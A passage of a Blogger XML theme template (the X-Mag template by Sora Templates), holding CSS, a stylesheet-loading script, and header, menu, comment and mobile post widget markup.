tr{position:absolute;top:-9999em;left:-9999em}.post-table tr{border:0.125em solid #333;border-bottom:0}.post-table tr + tr{margin-top:1.5em}.post-table tr,.post-table td{display:block}.post-table td{border:none;border-bottom:0.125em solid #333;padding-left:50%}.post-table td:before{content:attr(data-label);display:inline-block;font-weight:bold;line-height:1.5;margin-left:-100%;width:100%}}@media (max-width: 20em){.post-table td{padding-left:0.75em}.post-table td:before{display:block;margin-bottom:0.75em;margin-left:0}}
.FollowByEmail {
    clear: both;
}
.widget .post-body ol {
    padding: 0 0 0 15px;
}
.post-body ul li {
    list-style: none;
}
</style>
<b:template-skin><![CDATA[
/*------Layout (No Edit)----------*/
body#layout {
width:800px;
}
body#layout #body-wrapper {
    padding: 0;
    width: 800px
}
body#layout #hot-section .widget{display:block}
body#layout .section h4 {
color: #333!important;
text-align:center;
text-transform:uppercase;
letter-spacing:1.5px;
}
body#layout #header-wrappers {
    padding: 0;
}
body#layout #featured {
    opacity: 1;
}
body#layout .feat-main-wrapper.body-row {
    display: flex;
}
body#layout #hot-wrapper {
    width: 60%;
}
body#layout {
    padding: 20px 0;
    width: 800px;
}
body#layout .tyard-ran {
    width: 40%;
}
body#layout #ticker{display:none}
body#layout .ticker-wrap{padding:0px}

body#layout .tm-menu {
height: auto;
}
body#layout #menu {
display: block;
visibility:visible;
height: auto;
}
body#layout .tyard-ran .randoom {
    min-height: inherit;
    max-height: inherit;
}
body#layout #menu .widget {
display: block;
visibility:visible;
}
body#layout .lowerbar {
    width: 28.07%;
    float: left;
}
body#layout .top-bar-social {
    height: auto;
}
body#layout .headerleft {
    width: 280px;
}
body#layout .headerright {
    width: 440px;
}
body#layout #content-wrapper {
    margin: 0 auto
}

body#layout #main-wrapper {
    float: left;
    width: 70%;
    margin: 0;
    padding: 0
}

body#layout #sidebar-wrapper {
    float: right;
    width: 30%;
    margin: 0;
    padding: 5px 0 0;
    background-color: #f8e244!important
}
body#layout #sidebar-wrapper .section {
    background-color: #fff;
    border: 1px solid #fff
}
body#layout #sidebar-wrapper .section .widget-content {
    border-color: #5a7ea2!important
}
body#layout #sidebar-wrapper .section .draggable-widget .widget-wrap2 {
    background-color: #5a7ea2!important
}

body#layout #main-wrapper #main {
    margin-right: 4px;
    background-color: #5a7ea2;
    border-color: #34495e
}
body#layout #main-wrapper #main h4 {
    color: #fff!important
}
body#layout .layout-widget-description {
    display: none!important
}
body#layout #Blog1 .widget-content {
    border-color: #34495e
}
body#layout .FollowByEmail .widget-content:before, body#layout #ty_footer {
display:none;
}
/*------Layout (end)----------*/
]]></b:template-skin>



<b:include data='blog' name='google-analytics'/>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js' type='text/javascript'/>
<script type='text/javascript'>
//<![CDATA[
//CSS Ready
function loadCSS(e, t, n) {
    "use strict";
    var i = window.document.createElement("link");
    var o = t || window.document.getElementsByTagName("script")[0];
    i.rel = "stylesheet";
    i.href = e;
    i.media = "only x";
    o.parentNode.insertBefore(i, o);
    setTimeout(function() {
        i.media = n || "all"
    })
}
loadCSS("//fonts.googleapis.com/css?family=Roboto:400,400i,700|Bungee+Inline");
loadCSS("//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css");

//]]>
</script>

</head>
<body expr:class='data:blog.pageType'>
&lt;div id=&quot;body-wrapper&quot; class=&quot;<data:blog.pageType/><b:if cond='data:blog.url == data:blog.homepageUrl'> home</b:if><b:if cond='data:blog.pageType == &quot;static_page&quot;'> item</b:if><b:if cond='data:blog.pageType == &quot;archive&quot;'> index</b:if>&quot;&gt;

<div class='ticker-wrap'>
<div class='ticker-wrap-wrapper body-row'>
<h2 class='title'>Breaking</h2>
<div id='ticker'>
</div>
	<b:section class='top-bar-social blue' id='header social widget' maxwidgets='1' name='Top Social Widget' showaddelement='no'>
<b:widget id='LinkList230' locked='true' title='Social Media Icons' type='LinkList' version='1'>
  <b:widget-settings>
    <b:widget-setting name='sorting'>NONE</b:widget-setting>
    <b:widget-setting name='text-1'>twitter</b:widget-setting>
    <b:widget-setting name='link-1'>https://twitter.com/LiveBlogger1</b:widget-setting>
    <b:widget-setting name='text-0'>facebook</b:widget-setting>
    <b:widget-setting name='link-2'>https://www.instagram.com/livebloggerofficial/</b:widget-setting>
    <b:widget-setting name='link-0'>https://www.facebook.com/soratemplates/</b:widget-setting>
    <b:widget-setting name='text-2'>instagram</b:widget-setting>
  </b:widget-settings>
  <b:includable id='main'>
            <div class='widget-content'>
              <ul id='social'>
                <b:loop values='data:links' var='link'>
                  <li><a expr:class='data:link.name' expr:href='data:link.target' expr:title='data:link.name'/></li>
                </b:loop>
              </ul>
            </div>
          </b:includable>
</b:widget>
</b:section>
</div>
  </div>
<div style='clear: both;'/> 
<div class='header-wrap'>
 <div class='body-row' id='header-wrappers'>
    <div class='headerleft'> 
      <b:section class='headerleft' id='headerleft' maxwidgets='1' name='Blog Logo' showaddelement='no'>
         <b:widget id='Header1' locked='true' title='X-Mag (Header)' type='Header' version='1'>
           <b:widget-settings>
             <b:widget-setting name='displayUrl'>http://4.bp.blogspot.com/-amWpFhDQJ2k/WpBpAjgveWI/AAAAAAAAEv4/LbJWdlin7XcY_tzDf4yhHrrixkjwwiBtwCK4BGAYYCw/s1600/logo.png</b:widget-setting>
             <b:widget-setting name='displayHeight'>91</b:widget-setting>
             <b:widget-setting name='sectionWidth'>314</b:widget-setting>
             <b:widget-setting name='useImage'>true</b:widget-setting>
             <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
             <b:widget-setting name='imagePlacement'>REPLACE</b:widget-setting>
             <b:widget-setting name='displayWidth'>230</b:widget-setting>
           </b:widget-settings>
           <b:includable id='main'>

  <b:if cond='data:useImage'>
    <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
      <!--
      Show image as background to text. You can't really calculate the width
      reliably in JS because margins are not taken into account by any of
      clientWidth, offsetWidth or scrollWidth, so we don't force a minimum
      width if the user is using shrink to fit.
      This results in a margin-width's worth of pixels being cropped. If the
      user is not using shrink to fit then we expand the header.
      -->
      <b:if cond='data:mobile'>
        <div id='header-inner'>
          <div class='titlewrapper' style='background: transparent'>
            <h1 class='title' style='background: transparent; border-width: 0px'>
              <b:include name='title'/>
            </h1>
          </div>
          <b:include name='description'/>
        </div>
      <b:else/>
        <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                      + &quot;background-position: &quot;                      + data:backgroundPositionStyleStr + &quot;; &quot;                      + data:widthStyleStr                      + &quot;min-height: &quot; + data:height                      + &quot;_height: &quot; + data:height                      + &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
          <div class='titlewrapper' style='background: transparent'>
            <h1 class='title' style='background: transparent; border-width: 0px'>
              <b:include name='title'/>
            </h1>
          </div>
          <b:include name='description'/>
        </div>
      </b:if>
    <b:else/>
      <!--Show the image only-->
      <div id='header-inner'>
        <a expr:href='data:blog.homepageUrl' style='display: block'><h1 style='display:none'/>
          <img expr:alt='data:title' expr:height='data:height' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' expr:width='data:width' style='display: block'/>
        </a>
        <!--Show the description-->
        <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
          <b:include name='description'/>
        </b:if>
      </div>
    </b:if>
  <b:else/>
    <!--No header image -->
    <div id='header-inner'>
      <div class='titlewrapper'>
        <h1 class='title'>
          <b:include name='title'/>
        </h1>
      </div>
      <b:include name='description'/>
    </div>
  </b:if>
</b:includable>
           <b:includable id='description'>
  <div class='descriptionwrapper'>
    <p class='description'><span><data:description/></span></p>
  </div>
</b:includable>
           <b:includable id='title'>
  <b:tag cond='data:blog.url != data:blog.homepageUrl' expr:href='data:blog.homepageUrl' name='a'>
    <data:title/>
  </b:tag>
</b:includable>
         </b:widget>
       </b:section> 
</div>
<div class='headerright'> 
<b:section class='headerright' id='headerright' maxwidgets='1' name='Header Ads' showaddelement='yes'>
   <b:widget id='HTML1' locked='false' title='' type='HTML' version='1'>
     <b:widget-settings>
       <b:widget-setting name='content'><![CDATA[<img alt="ads header" src="//3.bp.blogspot.com/-KJs65c4Yuo0/VtaHPqLkrbI/AAAAAAAADLQ/xAqLxB0gJFw/s1600-r/ad728.gif" />]]></b:widget-setting>
     </b:widget-settings>
     <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <!--b:include name='quickedit'/-->
</b:includable>
   </b:widget>
 </b:section> 
</div>
<div style='clear: both;'/>
  </div>

  </div>
<div class='tm-menu'>
<div class='body-row menu-wrap'>
        <b:section class='menu' id='menu' maxwidgets='1' name='Main Menu' showaddelement='yes'>
          <b:widget id='LinkList210' locked='true' title='Menu' type='LinkList' version='1'>
            <b:widget-settings>
              <b:widget-setting name='text-10'>_Video Doc</b:widget-setting>
              <b:widget-setting name='sorting'>NONE</b:widget-setting>
              <b:widget-setting name='link-1'>#</b:widget-setting>
              <b:widget-setting name='link-2'>#</b:widget-setting>
              <b:widget-setting name='link-0'>#</b:widget-setting>
              <b:widget-setting name='link-11'>http://www.soratemplates.com/2018/02/xmag-blogger-templates.html</b:widget-setting>
              <b:widget-setting name='link-10'>https://youtu.be/nQ37fDRMSss</b:widget-setting>
              <b:widget-setting name='text-9'>_Web Doc</b:widget-setting>
              <b:widget-setting name='link-9'>https://www.sorabloggingtips.com/2018/02/how-to-setup-xmag-blogger-template.html</b:widget-setting>
              <b:widget-setting name='text-8'>Documentation</b:widget-setting>
              <b:widget-setting name='link-7'>https://xmag-soratemplates.blogspot.com/soratemplates</b:widget-setting>
              <b:widget-setting name='link-8'>#</b:widget-setting>
              <b:widget-setting name='link-5'>https://xmag-soratemplates.blogspot.com/p/post-format-and-page-markup_7.html</b:widget-setting>
              <b:widget-setting name='link-6'>https://www.sorabloggingtips.com/2017/01/how-to-add-sitemap-widget-in-blogspot-blogs.html</b:widget-setting>
              <b:widget-setting name='link-3'>#</b:widget-setting>
              <b:widget-setting name='link-4'>#</b:widget-setting>
              <b:widget-setting name='text-1'>_Multi DropDown</b:widget-setting>
              <b:widget-setting name='text-0'>Features</b:widget-setting>
              <b:widget-setting name='text-3'>__DropDown 2</b:widget-setting>
              <b:widget-setting name='text-2'>__DropDown 1</b:widget-setting>
              <b:widget-setting name='text-5'>_ShortCodes</b:widget-setting>
              <b:widget-setting name='text-4'>__DropDown 3</b:widget-setting>
              <b:widget-setting name='text-7'>_Error Page</b:widget-setting>
              <b:widget-setting name='text-6'>_SiteMap</b:widget-setting>
              <b:widget-setting name='text-11'>Download This Template</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
            <div class='widget-content'>
              <ul itemscope='' itemtype='http://schema.org/SiteNavigationElement'> 
                <li><a expr:href='data:blog.homepageUrl'>Home</a></li>
                <b:loop values='data:links' var='link'>
                  <li itemprop='name'><a expr:href='data:link.target' itemprop='url'><data:link.name/></a></li>
                </b:loop>
              </ul>
            </div>
          </b:includable>
          </b:widget>
        </b:section>
<div class='ty-ran-yard'><span><a class='ran-sym'/></span></div>
  </div>
      </div>
<div style='clear: both;'/> 

    <div class='body-row' id='content-wrapper'>
    <div id='main-wrapper'>
   <b:section class='main' id='main' showaddelement='yes'>
     <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog' version='1'>
       <b:widget-settings>
         <b:widget-setting name='commentLabel'>Reviews</b:widget-setting>
         <b:widget-setting name='showShareButtons'>true</b:widget-setting>
         <b:widget-setting name='authorLabel'>By</b:widget-setting>
         <b:widget-setting name='style.unittype'>TextAndImage</b:widget-setting>
         <b:widget-setting name='timestampLabel'>Price:</b:widget-setting>
         <b:widget-setting name='reactionsLabel'/>
         <b:widget-setting name='showAuthorProfile'>false</b:widget-setting>
         <b:widget-setting name='style.layout'>1x1</b:widget-setting>
         <b:widget-setting name='showLocation'>false</b:widget-setting>
         <b:widget-setting name='showTimestamp'>true</b:widget-setting>
         <b:widget-setting name='postsPerAd'>1</b:widget-setting>
         <b:widget-setting name='style.bordercolor'>#ffffff</b:widget-setting>
         <b:widget-setting name='backlinksLabel'/>
         <b:widget-setting name='showDateHeader'>true</b:widget-setting>
         <b:widget-setting name='style.textcolor'>#222222</b:widget-setting>
         <b:widget-setting name='showCommentLink'>true</b:widget-setting>
         <b:widget-setting name='style.urlcolor'>#2c3242</b:widget-setting>
         <b:widget-setting name='showAuthor'>true</b:widget-setting>
         <b:widget-setting name='style.linkcolor'>#fb4834</b:widget-setting>
         <b:widget-setting name='style.bgcolor'>#ffffff</b:widget-setting>
         <b:widget-setting name='showLabels'>true</b:widget-setting>
         <b:widget-setting name='postLabelsLabel'>Product Tags:</b:widget-setting>
         <b:widget-setting name='showBacklinks'>false</b:widget-setting>
         <b:widget-setting name='showInlineAds'>false</b:widget-setting>
         <b:widget-setting name='showReactions'>false</b:widget-setting>
       </b:widget-settings>
       <b:includable id='main' var='top'>
  <b:if cond='!data:mobile'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <b:loop values='data:posts' var='post'>
        <b:if cond='data:post.isDateStart and not data:post.isFirstPost'>
          &lt;/div&gt;&lt;/div&gt;
        </b:if>
        <b:if cond='data:post.isDateStart'>
          &lt;div class=&quot;date-outer&quot;&gt;
        </b:if>
        <b:if cond='data:post.dateHeader'>
          <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
        </b:if>
        <b:if cond='data:post.isDateStart'>
          &lt;div class=&quot;date-posts&quot;&gt;
        </b:if>
        <div class='post-outer'>
          <b:include data='post' name='post'/>
          <b:include cond='data:blog.pageType in {&quot;static_page&quot;,&quot;item&quot;}' data='post' name='comment_picker'/>
        </div>

        <!-- Ad -->
        <b:if cond='data:post.includeAd'>
          <div class='inline-ad'>
            <data:adCode/>
          </div>
        </b:if>
      </b:loop>
      <b:if cond='data:numPosts != 0'>
        &lt;/div&gt;&lt;/div&gt;
      </b:if>
    </div>

    <!-- navigation -->
    <b:include name='nextprev'/>

    <!-- feed links -->
    <b:include name='feedLinks'/>

  <b:else/>
    <b:include name='mobile-main'/>
  </b:if>

  <b:include cond='data:top.showPlusOne' name='googlePlusBootstrap'/>
</b:includable>
       <b:includable id='backlinkDeleteIcon' var='backlink'>
  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
      <img src='https://resources.blogblog.com/img/icon_delete13.gif'/>
    </a>
  </span>
</b:includable>
       <b:includable id='backlinks' var='post'>
  <a name='links'/><h4><data:post.backlinksLabel/></h4>
  <b:if cond='data:post.numBacklinks != 0'>
    <dl class='comments-block' id='comments-block'>
      <b:loop values='data:post.backlinks' var='backlink'>
        <div class='collapsed-backlink backlink-control'>
          <dt class='comment-title'>
            <span class='backlink-toggle-zippy'>&#160;</span>
            <a expr:href='data:backlink.url' rel='nofollow'><data:backlink.title/></a>
            <b:include data='backlink' name='backlinkDeleteIcon'/>
          </dt>
          <dd class='comment-body collapseable'>
            <data:backlink.snippet/>
          </dd>
          <dd class='comment-footer collapseable'>
            <span class='comment-author'><data:post.authorLabel/> <data:backlink.author/></span>
            <span class='comment-timestamp'><data:post.timestampLabel/> <data:backlink.timestamp/></span>
          </dd>
        </div>
      </b:loop>
    </dl>
  </b:if>
  <p class='comment-footer'>
    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' target='_blank'><data:post.createLinkLabel/></a>
  </p>
</b:includable>
       <b:includable id='comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <h4 id='comment-post-message'>
        <a expr:id='data:widget.instanceId + &quot;_comment-editor-toggle-link&quot;' href='javascript:void(0)'><data:postCommentMsg/></a></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <h4 id='comment-post-message'><data:postCommentMsg/></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
    </script>
  </div>
</b:includable>
       <b:includable id='commentDeleteIcon' var='comment'>
  <span expr:class='&quot;item-control &quot; + data:comment.adminClass'>
    <b:if cond='data:showCmtPopup'>
      <div class='goog-toggle-button'>
        <div class='goog-inline-block comment-action-icon'/>
      </div>
    <b:else/>
      <a class='comment-delete' expr:href='data:comment.deleteUrl' expr:title='data:top.deleteCommentMsg'>
        <img src='https://resources.blogblog.com/img/icon_delete13.gif'/>
      </a>
    </b:if>
  </span>
</b:includable>
       <b:includable id='comment_count_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <span class='cmt_count_iframe_holder' expr:data-count='data:post.numComments' expr:data-onclick='data:post.addCommentOnclick' expr:data-post-url='data:post.url' expr:data-url='data:post.url.canonical.http'>
    </span>
  <b:else/>
    <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
      <data:post.commentLabelFull/>:
    </a>
  </b:if>
</b:includable>
       <b:includable id='comment_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <b:include data='post' name='iframe_comments'/>
  <b:elseif cond='data:post.showThreadedComments'/>
    <b:include data='post' name='threaded_comments'/>
  <b:else/>
    <b:include data='post' name='comments'/>
  </b:if>
</b:includable>
       <b:includable id='comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <b:if cond='data:post.allowComments'>
      <h4><data:post.commentLabelFull/>:</h4>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <b:if cond='data:post.hasOlderLinks'>
            <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'><data:post.oldestLinkText/></a>
              &#160;
            <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'><data:post.olderLinkText/></a>
              &#160;
          </b:if>

          <data:post.commentRangeText/>

          <b:if cond='data:post.hasNewerLinks'>
            &#160;
            <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'><data:post.newerLinkText/></a>
            &#160;
            <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'><data:post.newestLinkText/></a>
          </b:if>
        </span>
      </b:if>

      <div expr:id='data:widget.instanceId + &quot;_comments-block-wrapper&quot;'>
        <dl expr:class='data:post.avatarIndentClass' id='comments-block'>
          <b:loop values='data:post.comments' var='comment'>
            <dt expr:class='&quot;comment-author &quot; + data:comment.authorClass' expr:id='data:comment.anchorName'>
              <b:if cond='data:comment.favicon'>
                <img expr:src='data:comment.favicon' height='16px' style='margin-bottom:-2px;' width='16px'/>
              </b:if>
              <a expr:name='data:comment.anchorName'/>
              <b:if cond='data:blog.enabledCommentProfileImages'>
                <data:comment.authorAvatarImage/>
              </b:if>
              <b:if cond='data:comment.authorUrl'>
                <a expr:href='data:comment.authorUrl' rel='nofollow'><data:comment.author/></a>
              <b:else/>
                <data:comment.author/>
              </b:if>
              <data:commentPostedByMsg/>
            </dt>
            <dd class='comment-body' expr:id='data:widget.instanceId + data:comment.cmtBodyIdPostfix'>
              <b:if cond='data:comment.isDeleted'>
                <span class='deleted-comment'><data:comment.body/></span>
              <b:else/>
                <p>
                  <data:comment.body/>
                </p>
              </b:if>
            </dd>
            <dd class='comment-footer'>
              <span class='comment-timestamp'>
                <a expr:href='data:comment.url' title='comment permalink'>
                  <data:comment.timestamp/>
                </a>
                <b:include data='comment' name='commentDeleteIcon'/>
              </span>
            </dd>
          </b:loop>
        </dl>
      </div>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
            <data:post.oldestLinkText/>
          </a>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
            <data:post.olderLinkText/>
          </a>
          &#160;
          <data:post.commentRangeText/>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
            <data:post.newerLinkText/>
          </a>
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
            <data:post.newestLinkText/>
          </a>
        </span>
      </b:if>

      <p class='comment-footer'>
        <b:if cond='data:post.embedCommentForm'>
          <b:if cond='data:post.allowNewComments'>
            <b:include data='post' name='comment-form'/>
          <b:else/>
            <data:post.noNewCommentsText/>
          </b:if>
        <b:elseif cond='data:post.allowComments'/>
          <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
        </b:if>
      </p>
    </b:if>
    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:include cond='data:post.showBacklinks' data='post' name='backlinks'/>
    </div>
    </div>
  </div>
</b:includable>
       <b:includable id='feedLinks'>
  <b:if cond='data:blog.pageType != &quot;item&quot;'> <!-- Blog feed links -->
    <b:if cond='data:feedLinks'>
      <div class='blog-feeds'>
      </div>
    </b:if>

  <b:else/> <!--Post feed links -->
    <div class='post-feeds'>
      <b:loop values='data:posts' var='post'>
        <b:include cond='data:post.allowComments and data:post.feedLinks' data='post.feedLinks' name='feedLinksBody'/>
      </b:loop>
    </div>
  </b:if>
</b:includable>
       <b:includable id='feedLinksBody' var='links'>
  <div class='feed-links'>
  <data:feedLinksMsg/>
  <b:loop values='data:links' var='f'>
     <a class='feed-link' expr:href='data:f.url' expr:type='data:f.mimeType' target='_blank'><data:f.name/> (<data:f.feedType/>)</a>
  </b:loop>
  </div>
</b:includable>
       <b:includable id='iframe_comments' var='post'>

  <b:if cond='data:post.allowIframeComments'>
    <script expr:src='data:post.iframeCommentSrc' type='text/javascript'/>
    <div class='cmt_iframe_holder' expr:data-href='data:post.url.canonical' expr:data-viewtype='data:post.viewType'/>

    <b:if cond='data:post.embedCommentForm == &quot;false&quot;'>
      <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
    </b:if>
  </b:if>
</b:includable>
       <b:includable id='mobile-index-post' var='post'>
  <div class='mobile-date-outer date-outer'>
    <b:if cond='data:post.dateHeader'>
      <div class='date-header'>
        <span><data:post.dateHeader/></span>
      </div>
    </b:if>

    <div class='mobile-post-outer'>
      <a expr:href='data:post.url'>
        <h3 class='mobile-index-title entry-title' itemprop='name'>
          <data:post.title/>
        </h3>

        <div class='mobile-index-arrow'>&amp;rsaquo;</div>

        <div class='mobile-index-contents'>
          <b:if cond='data:post.thumbnailUrl'>
            <div class='mobile-index-thumbnail'>
              <div class='Image'>
                <img expr:src='data:post.thumbnailUrl'/>
              </div>
            </div>
          </b:if>

          <div class='post-body'>
            <b:if cond='data:post.snippet'><data:post.snippet/></b:if>
          </div>
        </div>

        <div style='clear: both;'/>
      </a>

      <div class='mobile-index-comment'>
        <b:include cond='data:blog.pageType != &quot;static_page&quot;                          and data:post.allowComments                          and data:post.numComments != 0' data='post' name='comment_count_picker'/>
      </div>
    </div>
  </div>
</b:includable>
       <b:includable id='mobile-main' var='top'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-index-post'/>
        </b:loop>
      <b:else/>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-post'/>
        </b:loop>
      </b:if>
    </div>

   <b:include name='mobile-nextprev'/>
</b:includable>
       <b:includable id='mobile-nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <div class='mobile-link-button' id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>&amp;lsaquo;</a>
      </div>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <div class='mobile-link-button' id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>&amp;rsaquo;</a>
      </div>
    </b:if>

    <div class='mobile-link-button' id='blog-pager-home-link'>
    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>
    </div>

    <div class='mobile-desktop-link'>
      <a class='home-link' expr:href='data:desktopLinkUrl'><data:desktopLinkMsg/></a>
    </div>

  </div>
  <div class='clear'/>
</b:includable>
       <b:includable id='mobile-post' var='post'>
  <div class='date-outer'>
    <b:if cond='data:post.dateHeader'>
      <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
    </b:if>
    <div class='date-posts'>
      <div class='post-outer'>

        <div class='post hentry uncustomized-post-template' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
          <b:if cond='data:post.thumbnailUrl'>
            <meta expr:content='data:post.thumbnailUrl' itemprop='image_url'/>
          </b:if>
          <meta expr:content='data:blog.blogId' itemprop='blogId'/>
          <meta expr:content='data:post.id' itemprop='postId'/>

          <a expr:name='data:post.id'/>
        <b:if cond='data:post.title'> 
                     <b:if cond='data:blog.pageType == &quot;index&quot;'> 
    <h2 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <a expr:href='data:post.link' itemprop='url'><data:post.title/></a> 
     <b:else/> 
        <b:if cond='data:post.url'> 
<a expr:href='data:post.url' itemprop='url'><data:post.title/></a> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
     </h2>
                       <b:elseif cond='data:blog.pageType == &quot;archive&quot;'/> 
<h2 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <a expr:href='data:post.link' itemprop='url'><data:post.title/></a> 
     <b:else/> 
        <b:if cond='data:post.url'> 
<a expr:href='data:post.url' itemprop='url'><data:post.title/></a> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
      </h2>
<b:else/> 
<h1 class='post-title entry-title' itemprop='name'> 
     <b:if cond='data:post.link'> 
       <data:post.title/> 
     <b:else/> 
        <b:if cond='data:post.url'> 
         <data:post.title/> 
<b:else/> 
          <data:post.title/> 
        </b:if> 
     </b:if> 
      </h1> 
</b:if> 
                    </b:if> 

          <div class='post-header'>
            <div class='post-header-line-1'/>
          </div>

          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
            <data:post.body/>
            <div style='clear: both;'/> <!-- clear for photos floats -->
          </div>

          <div class='post-footer'>
            <div class='post-footer-line post-footer-line-1'>
              <span class='post-author vcard'>
                <b:if cond='data:top.showAuthor'>
                  <b:if cond='data:post.authorProfileUrl'>
                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                      <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                      <a expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                        <span itemprop='name'><data:post.author/></span>
                      </a>
                    </span>
                  <b:else/>
                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                      <span itemprop='name'><data:post.author/></span>
                    </span>
                  </b:if>
                </b:if>
              </span>

              <span class='post-timestamp'>
                <b:if cond='data:top.showTimestamp'>
                  <data:top.timestampLabel/>
                  <b:if cond='data:post.url'>
                    <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
                    <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'><data:post.timestamp/></abbr></a>
                  </b:if>
                </b:if>
              </span>

              <span class='post-comment-link'>
                <b:include cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                                  and data:post.allowComments' data='post' name='comment_count_picker'/>
              </span>
            </div>

            <div class='post-footer-line post-footer-line-2'>
              <b:if cond='data:top.showMobileShare'>
                <div class='mobile-link-button goog-inline-block' id='mobile-share-button'>
                  <a href='javascript:void(0);'><data:shareMsg/></a>
                </div>
              </b:if>
              <b:if cond='data:top.showDummy'>
                <div class='goog-inline-block dummy-container'><data:post.dummyTag/></div>
              </b:if>
            </div>

          </div>
        </div>

        <b:include cond='data:blog.pageType in {&quot;static_page&quot;,&quot;item&quot;}' data='post' name='comment_picker'/>
      </div>
    </div>
  </div>
</b:includable>
       <b:includable id='nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <span id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'><data:newerPageTitle/></a>
      </span>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <span id='blog-pager-older-link'>
